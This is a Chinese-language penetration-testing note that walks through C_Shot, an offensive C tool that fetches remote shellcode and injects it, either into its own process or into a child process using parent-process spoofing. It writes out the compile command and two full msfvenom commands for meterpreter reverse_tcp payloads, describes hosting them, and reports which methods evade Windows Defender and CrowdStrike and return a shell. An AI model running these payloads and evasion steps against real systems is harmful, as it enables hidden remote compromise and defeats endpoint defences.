	From:
	https://github.com/anthemtotheego/C_Shot
	http://blog.redxorblue.com/2020/07/cshot-just-what-doctor-ordered.html
	C_Shot是一种用C语言编写的攻击性安全工具，旨在通过HTTP / HTTPS下载远程shellcode二进制文件（.bin），注入并执行shellcode。
	1.shellcode注入其自己的进程
	2.使用父进程欺骗将shellcode注入子进程
	使用C_Shot之类的工具的好处是，我们要执行的恶意代码没有存储在二进制文件中，而是从远程位置检索，读入内存然后执行。这有助于使诸如C_Shot之类的工具对AV / EDR显得相当友好，并且不会被发现。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/773.png)

	cl / D _UNICODE / D UNICODE cshot.c
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/774.png)

	生成分阶段payload
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -a x64 --platform windows -b "\x00" -f raw -o /root/Desktop/DefaultStaged.bin
	生成无阶段payload
	msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST= IP LPORT= PORT -a x64 --platform windows -b "\x00" -f raw -o /root/Desktop/DefaultStageless.bin
	现在我们已经建立了二进制文件，现在需要一个Web服务。例如运行python -m SimpleHTTPServer 80，或者将它们托管在外部某个地方。对于本文中的所有示例，我将使用github托管shellcode。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/775.png)

	确保windows defender打开。
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/776.png)

	注入到自己的进程中
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/777.png)

	测试分阶段的shellcode会被windows defender拦截
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/778.png)

	无阶段的shellcode不会被拦截
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/779.png)

	获得shell
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/780.png)

	测试分阶段shellcode欺骗父进程方法：
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/781.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/782.png)

	获得shell
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/783.png)

	现在测试下CrowdStrike
	注入到自己的进程，两种shellcode都被拦截
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/784.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/785.png)

	欺骗父进程
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/786.png)

	获得shell
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/787.png)
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/788.png)

	分阶段和无阶段的shellcode在使用欺骗父进程方法时都可以绕过av。
	此工具在公共发行版中，没有进行任何形式的API隐藏，字符串混淆，内存保护技巧等工作。如果未进行任何修改，则对该工具的静态分析应该很容易发现。
